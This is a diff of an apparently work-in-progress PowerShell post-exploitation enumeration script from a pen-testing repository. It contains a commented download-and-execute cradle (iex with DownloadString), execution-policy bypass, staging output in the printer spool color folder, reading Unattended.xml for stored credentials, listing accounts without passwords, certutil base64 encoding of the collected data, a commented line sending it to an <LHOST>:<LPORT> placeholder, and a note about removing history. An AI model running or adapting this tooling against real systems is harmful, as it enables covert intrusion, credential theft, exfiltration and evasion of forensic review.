@@ -1,6 +1,7 @@
 #Work in progress!!!
 #Download webenum.ps1
 #powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h1dz/Pen-Testing/BashScripts/webenum.ps1')"
+#powershell Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy Bypass     change so no input needed
 Unblock-File -Path .\webenum.ps1
 powershell -ExecutionPolicy Bypass -noninteractive -nologo -File .\webenum.ps1
 New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\1.txt"
@@ -24,6 +25,8 @@ Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File 
 Get-Content "C:\Windows\Panther\Unattend\Unattended.xml" | Out-File -FilePath .\1.txt -Append 
 # C:\ Owner
 Get-Acl C:\ | Out-File -FilePath .\1.txt -Append  
+# SPN
+
 # Cmdlets
 Get-Command -CommandType Cmdlet | measure | Out-File -FilePath .\1.txt -Append  
 # Execution policy
@@ -75,9 +78,8 @@ foreach($port in $text_port){
 
 }
 # encode base64
-certutil -encode "C:\Windows\System32\spool\drivers\color\1.txt" 2.txt
-rm 1.txt
-#rm 2.txt
+certutil -encode "C:\Windows\System32\spool\drivers\color\1.txt" 1.txt
+rm 2.txt
 #send output file
 #Invoke-WebRequest "http://<LHOST>:<LPORT>/2.txt" -OutFile "2.txt"	                                                                                     #Change L IP / PORT
 # remove bash history
